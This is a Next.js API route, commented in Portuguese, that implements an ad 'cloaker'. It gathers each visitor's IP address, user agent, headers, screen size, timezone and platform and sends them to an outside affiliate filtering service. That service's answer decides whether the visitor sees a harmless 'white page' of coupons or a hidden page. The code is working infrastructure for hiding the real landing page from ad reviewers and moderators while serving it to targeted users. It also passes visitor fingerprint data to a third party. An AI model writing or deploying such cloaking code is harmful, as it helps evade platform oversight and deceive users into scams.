import { NextRequest, NextResponse } from 'next/server'

// Configuração do cloaker
const CLOAKER_CONFIG = {
  url: 'https://www.altercpa.one/fltr/969-8f076e082dbcb1d080037ec2c216d589-15047',
  whitePageUrl: '/cupons'
}

export async function POST(request: NextRequest) {
  try {
    // Pegar dados do cliente
    const body = await request.json()
    
    // Preparar dados para enviar ao cloaker
    const serverData = {
      HTTP_HOST: request.headers.get('host') || '',
      HTTP_USER_AGENT: body.userAgent || request.headers.get('user-agent') || '',
      HTTP_ACCEPT: request.headers.get('accept') || '',
      HTTP_ACCEPT_LANGUAGE: body.language || request.headers.get('accept-language') || '',
      HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
      HTTP_REFERER: body.referrer || request.headers.get('referer') || '',
      REMOTE_ADDR: body.ip || request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || '',
      REQUEST_URI: body.pathname + body.search,
      REQUEST_METHOD: 'GET',
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: body.search.substring(1),
      // Dados adicionais do cliente
      SCREEN_WIDTH: body.screenWidth || '',
      SCREEN_HEIGHT: body.screenHeight || '',
      TIMEZONE: body.timezone || '',
      PLATFORM: body.platform || ''
    }

    console.log('🎯 [Cloaker API] Verificando usuário:', {
      userAgent: serverData.HTTP_USER_AGENT,
      ip: serverData.REMOTE_ADDR,
      queryString: serverData.QUERY_STRING
    })

    // Fazer requisição para o cloaker
    const formBody = new URLSearchParams(serverData as any).toString()
    
    const response = await fetch(CLOAKER_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': serverData.HTTP_USER_AGENT
      },
      body: formBody
    })

    if (response.ok) {
      const result = await response.json()
      
      console.log('✅ [Cloaker API] Resposta:', result)
      
      return NextResponse.json({
        success: true,
        type: result.type,
        url: result.url,
        shouldRedirect: result.type === 'white'
      })
    } else {
      // Fallback: mostrar white page
      return NextResponse.json({
        success: true,
        type: 'white',
        url: CLOAKER_CONFIG.whitePageUrl,
        shouldRedirect: true
      })
    }
  } catch (error) {
    console.error('❌ [Cloaker API] Erro:', error)
    
    // Em caso de erro, mostrar white page por segurança
    return NextResponse.json({
      success: true,
      type: 'white',
      url: CLOAKER_CONFIG.whitePageUrl,
      shouldRedirect: true
    })
  }
}
